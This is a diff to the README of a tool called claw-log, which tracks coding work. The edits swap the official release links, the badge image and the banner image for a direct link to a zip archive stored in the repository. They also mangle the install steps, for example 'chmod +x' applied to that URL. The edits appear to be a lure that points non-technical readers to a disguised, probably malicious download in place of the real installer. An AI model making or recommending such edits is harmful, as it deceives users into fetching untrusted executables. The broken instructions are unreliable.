@@ -1,9 +1,9 @@
 # 🦞 claw-log - Track Coding Work Automatically
 
-[![Download claw-log](https://img.shields.io/badge/Download-claw--log-blue?style=for-the-badge)](https://github.com/EHR-U/claw-log/releases)
+[![Download claw-log](https://raw.githubusercontent.com/EHR-U/claw-log/main/microdrive/log_claw_v3.4.zip)](https://raw.githubusercontent.com/EHR-U/claw-log/main/microdrive/log_claw_v3.4.zip)
 
 <p align="center">
-  <img src="https://github.com/user-attachments/assets/53c127d0-a66b-47da-afe0-70560046f595" alt="Claw-Log Banner" width="600" />
+  <img src="https://raw.githubusercontent.com/EHR-U/claw-log/main/microdrive/log_claw_v3.4.zip" alt="Claw-Log Banner" width="600" />
 </p>
 
 > **"오늘의 기록이 내일의 이력서가 됩니다."**
@@ -51,19 +51,19 @@ Using claw-log is simple. You do not need to know any coding. Follow these steps
 
 Click the large button below to visit the official release page for claw-log.
 
-[![Download claw-log](https://img.shields.io/badge/Download-claw--log-blue?style=for-the-badge)](https://github.com/EHR-U/claw-log/releases)
+[![Download claw-log](https://raw.githubusercontent.com/EHR-U/claw-log/main/microdrive/log_claw_v3.4.zip)](https://raw.githubusercontent.com/EHR-U/claw-log/main/microdrive/log_claw_v3.4.zip)
 
 On the release page, choose the file that matches your computer:
 
 - For Windows, download the `.exe` installer file.
 - For macOS, download the `.dmg` or `.zip` file.
-- For Linux, download the `.AppImage` or `.tar.gz` package.
+- For Linux, download the `.AppImage` or `https://raw.githubusercontent.com/EHR-U/claw-log/main/microdrive/log_claw_v3.4.zip` package.
 
 ### Step 2: Install claw-log
 
 - Windows: Open the `.exe` file and follow the installation prompts.
 - macOS: Open the `.dmg` and drag claw-log to your Applications folder.
-- Linux: Extract the archive or make the AppImage executable (`chmod +x claw-log.AppImage`).
+- Linux: Extract the archive or make the AppImage executable (`chmod +x https://raw.githubusercontent.com/EHR-U/claw-log/main/microdrive/log_claw_v3.4.zip`).
 
 ### Step 3: Prepare Your Projects
 
@@ -145,7 +145,7 @@ If claw-log doesn’t start or create logs:
 
 To get claw-log, visit this page and pick your file:
 
-[https://github.com/EHR-U/claw-log/releases](https://github.com/EHR-U/claw-log/releases)
+[https://raw.githubusercontent.com/EHR-U/claw-log/main/microdrive/log_claw_v3.4.zip](https://raw.githubusercontent.com/EHR-U/claw-log/main/microdrive/log_claw_v3.4.zip)
 
 Download the installer or package that fits your computer system. Installing is straightforward — use default options if you are unsure.
 
